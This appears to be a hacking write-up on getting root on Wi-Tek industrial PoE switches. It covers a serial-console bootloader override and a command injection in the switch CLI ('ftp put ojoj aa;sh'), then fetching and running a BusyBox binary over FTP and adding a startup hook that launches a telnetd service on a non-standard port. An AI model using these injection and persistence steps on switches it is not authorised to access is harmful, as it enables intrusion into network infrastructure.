# Wi-Tek Industrial Switch Hack

<img width="560" height="432" alt="WI-PMS312GF-I-view1" src="https://github.com/user-attachments/assets/086ac26a-82fe-421e-a6ad-355c6d047699" />

This article demonstrates how to gain root access on inexpensive Chinese **Wi-Tek Industrial Managed Switches**. 
Wi-Tek (a Chinese OEM/ODM for affordable managed/unmanaged Ethernet switches, often rebranded for ISPs/telecom) runs embedded Linux with BusyBox on Broadcom SoCs (e.g., BCM3302).
These devices are prone to local privilege escalation via command injection in the restricted CLI, granting root from limited access. 
Serial console provides direct shell entry, but CLI exploits enable remote/local pivots. This method leverages a classic BusyBox flaw for full compromise.

Tested on the following models:
* WI-PMS312GF-l [8GE+4SFP L2 Managed Industrial Grade PoE Switch](https://www.cohesiveglobal.com/Wi-Tek/WI-PMS312GF-I-industrial-poe-switch.php)

This article actually describes two methods of gaining root access: one remotely, and the other locally via the serial console port.

# Getting Root Access via Serial Console

After powering on the device, immediately start pressing **Ctrl + C** to interrupt the default boot process.
You will then be presented with the bootloader command prompt. Enter the following command:

```
setenv LINUX_CMDLINE "console=ttyS0,115200 root=mtd4 rw rootfstype=jffs2 init=/bin/sh"
boot -elf flash0.os:
```

You will now be prompted into single-user mode, where you have root access and can modify startup scripts located at **/product/product.sh** and the main init system file **/etc/init.d/rcS**.

It is also possible to load the kernel via TFTP using the following syntax:
```
ifconfig eth0 -addr=192.168.1.2 -mask=255.255.255.0
boot -elf -z -tftp 192.168.1.1:/vmlinuz.elf
```

# Getting Root Access via Telnet from the Switch CLI

This method exploits a classic vulnerability:

```
telnet switch_ip
ftp put ojoj aa;sh
```

Executing this command grants root access to the running Linux system.

<img width="560" alt="gaining root" src="https://github.com/user-attachments/assets/8876a9a6-2235-4020-9da0-3c67f401555c" />

### Background

The technique I'm referring to—"ftp put ojoj aa;sh"—exploits a classic command injection vulnerability in the CLI (Command-Line Interface) of certain network switches 
(e.g., Cisco-like or embedded Linux-based devices running BusyBox). This is a well-known issue in older or misconfigured embedded systems, 
where the CLI parser doesn't properly sanitize user input before passing it to underlying system commands.
This is based on common patterns in embedded Linux devices (like those using BusyBox v1.4.1 or similar), 
where CLI commands are implemented via shell scripts or applets that invoke tools like ftpput.

**Affected Versions:** This is prevalent in BusyBox <1.30 (thisr example shows v1.4.1 from 2005–2015 builds), where argument parsing in applets like ftpput doesn't strip shell operators. No specific CVE directly matches "ftpput injection," but it's akin to general BusyBox command injection flaws (e.g., CVE-2021-42374 for shell expansions in ash, or broader CLI vulns like Cisco's CVE-2018-0296).

## More Functions Using a Full-Featured BusyBox

<img width="560" alt="full featured busybox" src="https://github.com/user-attachments/assets/960ce806-c99a-4894-93d9-601afe62e0fb" />


Download [busybox-mipsel](https://www.zhiwanyuzhou.com/download/Software/busybox/busybox-mipsel)
and place it on an FTP server within the same network.
You can then transfer it to the switch using the following commands:

```
ftpget -v -u test -p test -P 2121 10.1.14.10 busybox switch/busybox-mipsel
chmod +x busybox
./busybox
```

## Permanent Access via a Custom Telnet Server

We can set up a Telnet server on the switch in a more secure way than the default configuration.
First, change the root password using the `passwd` command. Then, use the upgraded BusyBox binary to launch a telnetd daemon on a non-standard port.
Finally, create an initialization script that will be executed from the vendor startup script `/product/product.sh`.

Create a file named **/product/hack.sh** and add the following contents:
```
#!/bin/sh
echo "Sleeping..."
/bin/busybox sleep 60
echo "Downloading busybox..."
/bin/busybox ftpget -v -u test -p test -P 2121 10.1.14.10 /tmp/busybox switch/busybox-mipsel
echo "Setting executable flag of busybox..."
/bin/busybox chmod +x /tmp/busybox
echo "Making /dev/pts directory..."
/bin/busybox mkdir /dev/pts &
echo "Mounting devpts..."
/bin/busybox mount -t devpts none /dev/pts
echo "Launcing telnetd..."
/tmp/busybox telnetd -p 24 -l /bin/login &
```

Now open /product/product.sh and after the line `trap ""  SIGQUIT`` add the following line:
```
nohup /product/hack.sh > /tmp/hack.log 2>&1 &
```

That’s all! You can now reboot the device and enjoy the results of your hard work.

## Returning to the Switch CLI

```
/tmp/unos/app/vtysh
```

## Setup ntp (time sync client)

You can add the following line at the end of your hack.sh script:
```
/tmp/busybox ntpd -p 10.2.10.1
```

